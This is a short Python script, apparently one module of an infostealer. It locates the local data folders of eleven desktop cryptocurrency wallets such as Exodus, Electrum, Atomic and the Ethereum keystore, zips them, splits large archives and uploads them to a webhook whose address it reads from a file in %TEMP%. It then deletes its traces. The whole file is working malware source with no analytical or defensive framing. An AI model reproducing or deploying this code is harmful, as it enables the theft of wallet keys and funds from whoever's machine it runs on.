import os
import zipfile
import requests
import shutil

WEBHOOK_FILE_PATH = os.path.join(os.getenv("TEMP"), "config", "webhook.txt")

def get_webhook_url():
    if os.path.exists(WEBHOOK_FILE_PATH):
        with open(WEBHOOK_FILE_PATH, 'r') as file:
            return file.read().strip()
    return None

# Stockage dans %TEMP%
STORAGE_PATH = os.path.join(os.getenv("TEMP"), "Zips")  # Répertoire dans %TEMP%

APPDATA = os.getenv("APPDATA")

WALLET_PATHS = [
    {"name": "Atomic", "path": os.path.join(APPDATA, "atomic", "Local Storage", "leveldb")},
    {"name": "Exodus", "path": os.path.join(APPDATA, "Exodus", "exodus.wallet")},
    {"name": "Electrum", "path": os.path.join(APPDATA, "Electrum", "wallets")},
    {"name": "Electrum-LTC", "path": os.path.join(APPDATA, "Electrum-LTC", "wallets")},
    {"name": "Zcash", "path": os.path.join(APPDATA, "Zcash")},
    {"name": "Armory", "path": os.path.join(APPDATA, "Armory")},
    {"name": "Bytecoin", "path": os.path.join(APPDATA, "bytecoin")},
    {"name": "Jaxx", "path": os.path.join(APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")},
    {"name": "Etherium", "path": os.path.join(APPDATA, "Ethereum", "keystore")},
    {"name": "Guarda", "path": os.path.join(APPDATA, "Guarda", "Local Storage", "leveldb")},
    {"name": "Coinomi", "path": os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets")},
]

MAX_FILE_SIZE = 8 * 1024 * 1024

def send_to_webhook(file_path, filename):
    webhook_url = get_webhook_url()
    if webhook_url:
        with open(file_path, 'rb') as file:
            response = requests.post(webhook_url, files={"file": (filename, file)})
            return response
    else:
        print("Webhook URL non trouvé.")
        return None

def zip_to_storage(name, path, storage_path):
    zip_filename = os.path.join(storage_path, f"{name}.zip")
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for foldername, subfolders, filenames in os.walk(path):
            for filename in filenames:
                file_path = os.path.join(foldername, filename)
                zipf.write(file_path, os.path.relpath(file_path, path))
    return zip_filename

def split_and_send(zip_filename):
    zip_size = os.path.getsize(zip_filename)
    if zip_size > MAX_FILE_SIZE:
        with open(zip_filename, 'rb') as zipf:
            chunk_index = 0
            while chunk := zipf.read(MAX_FILE_SIZE):
                chunk_filename = f"{zip_filename}_part{chunk_index}"
                with open(chunk_filename, 'wb') as chunk_file:
                    chunk_file.write(chunk)
                send_to_webhook(chunk_filename, os.path.basename(chunk_filename))
                os.remove(chunk_filename)
                chunk_index += 1
    else:
        send_to_webhook(zip_filename, os.path.basename(zip_filename))

if not os.path.exists(STORAGE_PATH):
    os.makedirs(STORAGE_PATH)

for wallet_file in WALLET_PATHS:
    if os.path.exists(wallet_file["path"]):
        try:
            zip_filename = zip_to_storage(wallet_file["name"], wallet_file["path"], STORAGE_PATH)
            split_and_send(zip_filename)
            os.remove(zip_filename)
        except Exception as e:
            print(f"Error processing {wallet_file['name']}: {e}")
